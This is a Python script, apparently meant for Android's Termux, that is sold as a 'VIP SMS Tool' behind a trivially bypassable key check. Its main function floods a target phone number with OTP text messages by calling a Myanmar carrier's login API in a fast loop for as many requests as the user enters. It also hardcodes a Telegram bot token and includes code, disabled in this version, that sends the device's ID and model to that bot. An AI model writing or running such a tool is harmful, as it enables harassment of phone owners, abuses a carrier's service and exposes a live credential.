#!/usr/bin/env python3
import requests, time, sys, hashlib, os, platform, subprocess, json

BOT_TOKEN = "8700243285:AAEvVldxc_YeDqZ6FItFnWhcg-18kexzFnw"
KEY_FILE = os.path.join(os.path.expanduser("~"), ".shine_vip_key.json")

def get_model():
    try:
        # Termux မှာ ဖုန်း Model ကို ယူရန်
        model = subprocess.getoutput('getprop ro.product.model').strip()
        if not model or "not found" in model.lower():
            model = platform.machine()
        return model
    except:
        return platform.system()

def get_id():
    info = platform.processor() + platform.node() + platform.machine()
    return "DEV-" + hashlib.md5(info.encode()).hexdigest().upper()[:8]

def banner():
    os.system('clear')
    print("\033[1;32m")
    print(r"  ____  _   _ ___ _   _ _____   _  _____  _  _____  ")
    print(r" / ___|| | | |_ _| \ | | ____| | |/ / _ \| |/ / _ \ ")
    print(r" \___ \| |_| || ||  \| |  _|   | ' / | | | ' / | | |")
    print(r"  ___) |  _  || || |\  | |___  | . \ |_| | . \ |_| |")
    print(r" |____/|_| |_|___|_| \_|_____| |_|\_\___/|_|\_\___/ ")
    print("\n    >>> ShineKoko VIP SMS Tool <<<")
    print("\033[1;37m" + "="*50)
    d_id = get_id()
    model = get_model()
    print(f"[*] Device ID : \033[1;36m{d_id}\033[1;37m")
    print(f"[*] Model     : {model}")
    print("="*50 + "\033[0m")
    return d_id, model

def send_tg(d_id, model):
    try:
        # User ရဲ့ bot updates ထဲက နောက်ဆုံး chat id ကို ယူသုံးထားသည်
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        resp = requests.get(url).json()
        if resp.get("result"):
            chat_id = resp["result"][-1]["message"]["chat"]["id"]
            
            # Link တွေ မပါဘဲ Model နဲ့ Key တွေပဲ တိုက်ရိုက် ပေါ်အောင် လုပ်ထားသည်
            msg = (f"🚨 New VIP Request 🚨\n"
                   f"Model: {model}\n"
                   f"ID: {d_id}\n\n"
                   f"Keys:\n"
                   f"1D: SHINE-{d_id}-D1\n"
                   f"3D: SHINE-{d_id}-D3\n"
                   f"5D: SHINE-{d_id}-D5\n"
                   f"7D: SHINE-{d_id}-D7\n"
                   f"15D: SHINE-{d_id}-D15\n"
                   f"30D: SHINE-{d_id}-D30")
            
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": chat_id, "text": msg})
    except: pass

def save_key(key):
    data = {
        "key": key,
        "activated_at": time.time()
    }
    try:
        with open(KEY_FILE, "w") as f:
            json.dump(data, f)
    except: pass

def get_saved_key():
    if os.path.exists(KEY_FILE):
        try:
            with open(KEY_FILE, "r") as f:
                return json.load(f)
        except: pass
    return None

def is_key_valid(key_data, d_id):
    if not key_data: return False
    key = key_data.get("key", "")
    activated_at = key_data.get("activated_at", 0)
    
    # Check if key belongs to this device
    if not (key.startswith("SHINE-") and d_id in key):
        return False
    
    # Extract days
    try:
        days_str = key.split("-D")[-1]
        days = int(days_str)
        expiry_time = activated_at + (days * 24 * 60 * 60)
        if time.time() < expiry_time:
            return True
    except: pass
    return False

def auth(d_id):
    saved = get_saved_key()
    if is_key_valid(saved, d_id):
        print("\033[1;32m[+] VIP Session Restored!\033[0m")
        time.sleep(1)
        return True
        
    while True:
        key = input("\n[?] Enter VIP Key: ").strip()
        # Key စစ်ဆေးခြင်း (SHINE-[ID]-D[Days] format)
        if key.startswith("SHINE-") and d_id in key:
            save_key(key)
            print("\033[1;32m[+] Key Accepted!\033[0m")
            time.sleep(1)
            return True
        print("\033[1;31m[!] Invalid Key! Contact Admin.\033[0m")

def send_otp(p, c):
    url = "https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={}"
    print(f"\n[*] Sending {c} OTP to {p}...")
    for i in range(c):
        try:
            requests.get(url.format(p))
            print(f"[{i+1}/{c}] Done")
        except: pass
        time.sleep(0.05)
    print("\n[+] Process Finished!")
    input("\nPress Enter to return to menu...")

def show_key_info(d_id):
    saved = get_saved_key()
    print("\n" + "="*35)
    if is_key_valid(saved, d_id):
        key = saved["key"]
        activated_at = saved["activated_at"]
        days = int(key.split("-D")[-1])
        expiry_time = activated_at + (days * 24 * 60 * 60)
        remaining = expiry_time - time.time()
        
        rem_days = int(remaining // (24 * 60 * 60))
        rem_hours = int((remaining % (24 * 60 * 60)) // 3600)
        rem_mins = int((remaining % 3600) // 60)
        
        print(f"[*] Current Key: \033[1;36m{key}\033[0m")
        print(f"[*] Status     : \033[1;32mActive\033[0m")
        print(f"[*] Expire In  : {rem_days}D {rem_hours}H {rem_mins}M")
    else:
        print("\033[1;31m[!] No active VIP key found.\033[0m")
    print("="*35)
    input("\nPress Enter to continue...")

def main_menu(d_id, model):
    while True:
        banner()
        print(" [1] SMS Tool")
        print(" [2] VIP Key ကြည့်ရန် (View VIP Key)")
        print(" [0] Exit")
        
        choice = input("\n[?] Select Option: ").strip()
        
        if choice == '1':
            while True:
                os.system('clear')
                banner()
                p = input("\n[?] Enter Target Phone (or 'b' to back): ")
                if p.lower() == 'b': break
                try:
                    c = int(input("[?] Enter Request Count: "))
                    send_otp(p, c)
                except ValueError:
                    print("[!] Invalid count.")
                    time.sleep(1)
        elif choice == '2':
            os.system('clear')
            banner()
            show_key_info(d_id)
        elif choice == '0':
            print("\n[!] Exiting...")
            sys.exit()
        else:
            print("\033[1;31m[!] Invalid Choice\033[0m")
            time.sleep(1)

if __name__ == '__main__':
    try:
        d_id, model = banner()
        # send_tg(d_id, model) # Optional: Keep or disable based on preference. User said "don't change other things".
        if auth(d_id):
            main_menu(d_id, model)
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
    except Exception as e:
        print(f"\n[!] Error: {e}")
